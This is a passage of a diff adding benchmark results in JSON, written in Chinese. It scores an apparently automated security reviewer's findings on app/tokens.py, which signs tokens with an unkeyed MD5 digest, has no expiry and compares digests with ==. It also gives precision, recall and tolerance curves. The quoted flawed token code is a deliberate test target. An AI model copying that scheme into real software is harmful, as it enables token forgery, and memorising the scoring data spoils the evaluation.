+                "evidence": "L17-19 `body = json.dumps(payload, sort_keys=True)` / `digest = hashlib.md5(body.encode()).hexdigest()` / `return body + \".\" + digest` —— 令牌中不含 exp/nonce 字段；L22-26 `def verify(token: str, public_key: str) -> bool:` … `return digest == recomputed` —— 无时间或一次性校验逻辑，也无状态存储。"
+              },
+              "nearest_label": {
+                "code": "CRYPTO02-a",
+                "file": "app/tokens.py",
+                "line": 12
+              },
+              "distance": 3,
+              "in_same_file": true
+            }
+          ],
+          "duplicates": [
+            {
+              "file": "app/tokens.py",
+              "line": 26,
+              "severity": "note",
+              "title": "摘要比对使用非常量时间的 ==，修复密钥化 MAC 后会成为侧信道",
+              "detail": "L26 用 Python 的 `==` 比较两个十六进制摘要字符串，其比较过程在首个不相等字符处提前返回，耗时与「匹配前缀长度」相关，理论上可按字节爆破摘要。重要限定：在当前实现下这条并不构成可利用漏洞，因为摘要计算不含密钥（见 L18 的发现），攻击者本来就能直接算出正确摘要；本条是修复 L18 之后必须一并处理的加固项——一旦换成 `hmac.compare_digest`（常量时间）以外的带密钥校验，`==` 的提前返回就会成为唯一的侧信道。因此按 note 记录，不夸大其当前影响。",
+              "evidence": "L26 `return digest == recomputed` —— 字符串 `==` 比较在 Python 中按字符逐位比较并在首个不等处返回，非常量时间；对比 `hmac.compare_digest` 的常量时间语义。"
+            }
+          ],
+          "precision": 0.6,
+          "recall": 0.6,
+          "f1": 0.6,
+          "tolerance_curve": {
+            "0": {
+              "precision": 0.5,
+              "recall": 0.6,
+              "f1": 0.545,
+              "spurious": 3,
+              "missed": 2,
+              "duplicates": 0
+            },
+            "1": {
+              "precision": 0.5,
+              "recall": 0.6,
+              "f1": 0.545,
+              "spurious": 3,
+              "missed": 2,
+              "duplicates": 0
+            },
+            "2": {
+              "precision": 0.6,
+              "recall": 0.6,
+              "f1": 0.6,
+              "spurious": 2,
+              "missed": 2,
+              "duplicates": 1
+            },
+            "3": {
+              "precision": 1.0,
+              "recall": 0.8,
+              "f1": 0.889,
+              "spurious": 0,
+              "missed": 1,
+              "duplicates": 2
+            },
+            "4": {
+              "precision": 1.0,
+              "recall": 0.8,
+              "f1": 0.889,
+              "spurious": 0,
+              "missed": 1,
+              "duplicates": 2
+            },
+            "6": {
+              "precision": 1.0,
+              "recall": 0.8,
+              "f1": 0.889,
+              "spurious": 0,
+              "missed": 1,
+              "duplicates": 2
+            },
+            "8": {
+              "precision": 1.0,
+              "recall": 0.8,
+              "f1": 0.889,
+              "spurious": 0,
+              "missed": 1,
+              "duplicates": 2
+            }
+          }
+        }
+      ]
+    }
+  ]
+}
